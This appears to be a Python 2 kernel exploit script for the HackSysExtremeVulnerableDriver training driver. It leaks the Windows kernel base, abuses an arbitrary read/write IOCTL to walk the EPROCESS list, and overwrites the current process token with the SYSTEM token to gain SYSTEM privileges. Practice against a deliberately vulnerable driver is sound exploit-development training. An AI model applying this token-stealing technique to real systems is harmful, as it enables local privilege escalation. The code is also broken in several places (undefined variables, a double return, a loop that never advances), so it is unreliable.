#!/usr/bin/python
# -*- coding: utf-8 -*-

import ctypes
import struct
import sys
import os
import time
import platform
from ctypes import *
from ctypes.wintypes import *

############################################ Windows Constants ##############################################

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
NULL = 0
STATUS_SUCCESS = 0
MOVEFILE_REPLACE_EXISTING = 0x01
CREATE_SUSPENDED = 0x00000004
THREADFUNC = CFUNCTYPE(None)
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
PAGE_READWRITE = 0x00000004
ThreadBasicInformation = 0

###################################################### DEFINITIONS ##########################################################

ntdll.NtAllocateVirtualMemory.argtypes = [
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    c_ulonglong,
    ]

kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong,
        c_char_p, c_ulonglong, POINTER(c_ulonglong)]

kernel32.DeviceIoControl.argtypes = [
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    POINTER(c_ulong),
    c_void_p,
    ]

kernel32.ReadProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p,
        c_size_t, POINTER(c_size_t)]

ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong,
        c_void_p, c_ulong, POINTER(c_ulonglong)]

STATUS_SUCCESS = 0
written = c_size_t()
read = c_size_t()

baseadd = c_ulonglong(0x000000001a000000)
addsize = c_ulonglong(0x3000)
user_addr = 0x000000001a000000


dwStatus = ntdll.NtAllocateVirtualMemory(
    0xFFFFFFFFFFFFFFFF,
    byref(baseadd),
    0,
    byref(addsize),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
    )

# If not zero (True), something didn't work.

if dwStatus != STATUS_SUCCESS:
    print ('Something went wrong while allocating memory', 'e')
    sys.exit()


########################################## KERNEL BASE ################################################

def getkernelBase(driver):
    print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
    sys_info = create_string_buffer(0)
    sys_info_len = c_ulong(0)

    ntdll.NtQuerySystemInformation(0xb, sys_info, len(sys_info),
                                   addressof(sys_info_len))

    sys_info = create_string_buffer(sys_info_len.value)

    result = ntdll.NtQuerySystemInformation(0xb, sys_info,
            len(sys_info), addressof(sys_info_len))

    if result == 0:
        print '[*] Success, allocated {}-byte result buffer'.format(str(len(sys_info)))
    else:

        print '[!] NtQuerySystemInformation failed with NTSTATUS: {}'.format(hex(result))

    class SYSTEM_MODULE_INFORMATION(Structure):

        _fields_ = [
            ('Reserved', c_void_p * 2),
            ('ImageBase', c_void_p),
            ('ImageSize', c_long),
            ('Flags', c_ulong),
            ('LoadOrderIndex', c_ushort),
            ('InitOrderIndex', c_ushort),
            ('LoadCount', c_ushort),
            ('ModuleNameOffset', c_ushort),
            ('ImageName', c_char * 256),
            ]

    handle_num = c_ulong(0)
    handle_num_str = create_string_buffer(sys_info.raw[:0x8])
    memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

    print '[*] Result buffer contains {} SystemModuleInformation objects'.format(str(handle_num.value))
    sys_info = create_string_buffer(sys_info.raw[0x8:])

    counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter
                + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if 'ntoskrnl' or 'ntkrnl' in tmp.ImageName:
            img_name = tmp.ImageName.split('\\')[-0x01]
            print '[*] Kernel Type: {}'.format(img_name)
            kernel_base = hex(tmp.ImageBase)[:-0x01]
            print '[*] Kernel Base: {}'.format(kernel_base)
            
            return (img_name, kernel_base)
    counter += sizeof(tmp)


########################################### CALCULATE OFFSETS FROM KERNEL #############################################

def get_PsISP_kernel_address(kernel_base, img_name):

    kernel32.LoadLibraryA.restype = c_uint64
    kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
    kernel32.GetProcAddress.restype = c_uint64

    # Load kernel image in userland and get PsInitialSystemProcess offset

    kernel_handle = kernel32.LoadLibraryA(img_name)
    print '[+] Loading %s in Userland' % img_name

    # print("[+] %s Userland Base Address : 0x%X" % (kernel_base, kernel_handle))

    PsISP_user_address = kernel32.GetProcAddress(kernel_handle,
            'PsInitialSystemProcess')
    print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' \
        % PsISP_user_address

    # Calculate PsInitialSystemProcess offset in kernel land

    system_process_base_pointer = c_uint64(kernel_base) + PsISP_user_address \
        - kernel_handle
    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' \
        % system_process_base_pointer

    PsISP_kernel_address = c_ulonglong()

    return system_process_base_pointer


################################################### WRITE ###########################################################

def writePrimitive(driver, what_addr, where):

    IoControlCode = 0x0022200B
    InputBuffer = c_void_p(0x000000001a000000)
    InputBufferLength = 0x10
    OutputBuffer = c_void_p(0)
    OutputBufferLength = 0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

    # Write the what value to what_addr

    data = struct.pack('<Q', what)
    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
            what_addr, data, len(data), byref(written))

    if dwStatus == 0:
        print ('Something went wrong while writing to memory', 'e')
        sys.exit()

    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
            0x000000001a000000, data, len(data), byref(written))

    if dwStatus == 0:
        print ('Something went wrong while writing to memory in the packing section'
               , 'e')
        sys.exit()

    print 'Value before DeviceIoControl: %08x' \
        % cast(0x000000001a000000, POINTER(c_ulonglong))[0]

    triggerIOCTL = kernel32.DeviceIoControl(
        driver,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        lpBytesReturned,
        NULL,
        )

    print 'Value after: %08x' % cast(0x000000001a000000,
            POINTER(c_ulonglong))[0]
    return triggerIOCTL


################################################### READ ###########################################################
                          # What is it you want to read? #We are writing it back to userland memory.

def readPrimitive(driver, what_addr, where):

    # We've created a block of memory at the top of userland via dwStatus

    IoControlCode = 0x0022200B
    InputBuffer = c_void_p(0x000000001a000000)
    InputBufferLength = 0x10
    OutputBuffer = c_void_p(0)
    OutputBufferLength = 0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

                                                            # THIS SHOULD BE USER_ADDR, OUR USER MEMORY PAGE

    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
            0x000000001a000000, data, len(data), byref(written))

    print 'Value before DeviceIoControl: %08x' % cast(user_addr,
            POINTER(c_ulonglong))[0]

    triggerIOCTL = kernel32.DeviceIoControl(
        driver,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        lpBytesReturned,
        NULL,
        )

    print 'Value after: %08x' % cast(user_addr, POINTER(c_ulonglong))[0]
    read_value = cast(user_addr, POINTER(c_ulonglong))[0]
    return triggerIOCTL
    return read_value


############################## GET CURRENT PROCESS TOKEN OFFSET ################################

unique_process_id_offset = 0x2e0
active_process_links_offset = 0x2e8
token_offset = 0x358


def get_current_eprocess(system_process_base_pointer):
    """ Returns ptr to Current EPROCESS structure """

    flink = c_ulonglong()
    readPrimitive(driver, system_process_base_pointer
                  + active_process_links_offset, user_addr)

    current_pEPROCESS = 0
    while 0x01:
        unique_process_id = c_ulonglong(0)

        # Adjust EPROCESS pointer for next entry

        system_process_base_pointer = flink.value \
            - unique_process_id_offset - 0x8

        # Get PID

        readPrimitive(driver, system_process_base_pointer
                      + unique_process_id_offset, user_addr)

        # Check if we're in the current process

        if os.getpid() == unique_process_id.value:
            current_pEPROCESS = system_process_base_pointer
            break

        readPrimitive(driver, system_process_base_pointer
                      + active_process_links_offset, user_addr)

        # If next same as last, we've reached the end

        if system_process_base_pointer == flink.value \
            - unique_process_id_offset - 0x8:
            break

    return currentprocessBase


########################################### MAIN ###############################################

def executeOverwrite():

    # This is a fixed address in our userland memory page.

    driver = kernel32.CreateFileA(
        '\\\\.\\HackSysExtremeVulnerableDriver',
        GENERIC_READ | GENERIC_WRITE,
        0,
        None,
        3,
        0,
        None,
        )
    if not driver or driver == -0x01:
        print '[!] Driver handle not found :(\n'
        sys.exit()
    else:
        print '[X] Got handle to the driver.\n'

        # Get kernel base.

        (img_name, kernel_base) = getkernelBase(driver)

        # Get system process base.

 
        system_process_base_pointer = \
            get_PsISP_kernel_address(kernel_base, img_name)

        # Read the value of that token.

        read_value = readPrimitive(driver, system_process_base_pointer,
                                   user_addr)

        # Walk the process list for wherever our process is in memory.

        currentprocessBase = \
            get_current_eprocess(system_process_base_pointer)

        # Define our expected offsets for this version of Windows.

        system_token = system_process_base_pointer + 0x358
        current_token = currentprocessBase + 0x358

        # Write the system_token over our current_token for SYSTEM privileges.

        success = writePrimitive(driver, system_token, current_token)

############################################ RUN ################################################

executeOverwrite()
